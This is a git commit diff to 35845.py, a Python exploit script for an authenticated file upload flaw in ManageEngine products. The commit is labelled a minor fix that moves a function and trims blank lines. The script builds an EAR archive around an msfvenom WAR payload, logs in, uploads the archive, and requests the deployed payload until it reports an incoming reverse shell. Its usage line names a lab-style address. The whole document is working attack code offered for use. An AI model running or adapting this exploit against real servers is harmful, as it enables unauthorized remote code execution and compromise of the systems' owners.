ba2776b024a3571b3206984512af747d6f130b7e
Andrea Bruschi <moonx2006@gmail.com>
2018-11-30 14:41:22 +0100

    minor fix

--- 35845.py
+++ 35845.py
@@ -6,25 +6,8 @@ import zipfile
 from requests_toolbelt import MultipartEncoder
 import string
 import random
-import time
 
-def make_ear(war_payload, war_app_base, ear_app_base, display_name, ear_file_name):
-    # Read in the war file created by msfvenom
-    ear = zipfile.ZipFile(ear_file_name + '.ear', "w")
-    #add war file to ear
-    ear.writestr(war_app_base + '.war', war_payload)
 
-    # ... and then we create an EAR file that will contain it.
-    app_xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
-    app_xml += "<application>"
-    app_xml += "<display-name>{}</display-name>".format(display_name)
-    app_xml += "<module><web><web-uri>{}</web-uri>".format(war_app_base + '.war')
-    app_xml += "<context-root>/{}</context-root></web></module></application>".format(ear_app_base)
-	
-    ear.writestr('META-INF/application.xml', app_xml)
-
-    ear.close()
-	
 def banner():
 
     print("""# ManageEngine Multiple Products Authenticated File Upload
@@ -59,14 +42,29 @@ def banner():
     print("Usage: script.py file.war host port")
     print("35845.py shell.war 10.11.1.145 8080")
 
+def make_ear(war_payload, war_app_base, ear_app_base, display_name, ear_file_name):
+    # Read in the war file created by msfvenom
+    ear = zipfile.ZipFile(ear_file_name + '.ear', "w")
+    #add war file to ear
+    ear.writestr(war_app_base + '.war', war_payload)
 
+    # ... and then we create an EAR file that will contain it.
+    app_xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+    app_xml += "<application>"
+    app_xml += "<display-name>{}</display-name>".format(display_name)
+    app_xml += "<module><web><web-uri>{}</web-uri>".format(war_app_base + '.war')
+    app_xml += "<context-root>/{}</context-root></web></module></application>".format(ear_app_base)
+	
+    ear.writestr('META-INF/application.xml', app_xml)
+
+    ear.close()
+	
 def get_cookie(target_uri):
 
     print("Requesting {}".format(target_uri))
     headers = { 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': None, 'Accept-Encoding': None, 'Accept': None }
     res = requests.get(target_uri, headers=headers)
     return res.cookies['JSESSIONID']
-
 
 def login(target_uri, cookie):
     
@@ -114,7 +112,6 @@ def run_payload(target_uri, ear_app_base, war_app_base, rts7):
     res = requests.get(target_uri, headers=headers)
     return res.status_code
 
-
 def main():
 
     if len(sys.argv) == 4:
@@ -139,13 +136,9 @@ def main():
         ear_file_name = rts4
         rts7 = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(9))
 
-
         make_ear(war_payload, war_app_base, ear_app_base, display_name, ear_file_name)
 
-
         target_uri = "http://" + host + ":" + port + "/"
-		
-
         cookie, url, text, status = login(target_uri, get_cookie(target_uri))
 
         if status == 200:
@@ -154,13 +147,10 @@ def main():
             print("[-] Login failed..")
             sys.exit(0)
 		
-
-
         #bogus upload 
         #payload_name = ear_app_base
         #payload_str = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(9))
         cookie, text, status = upload_request(cookie, target_uri, rts5, rts6)
-
 
         #payload uploas
         payload_name = ear_app_base
@@ -175,22 +165,17 @@ def main():
             print("[-] Upload gone wrong :/")
             sys.exit(0)
 
-
         for i in range(10):
             if run_payload(target_uri, ear_app_base, war_app_base, rts7) == 200:
                 print("[+] Hurray! Incoming reverse shell!")
                 sys.exit(0)
-                
             else:
                 rts7 = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(9))
 
         print("[-] Reverse shell not coming..")
         print("[+] Try to manually check here: " + target_uri + ear_app_base + "/" + war_app_base + "/" + rts7)
-
-		
     else:
         banner()
 		
-
 if __name__ == "__main__":
     main()
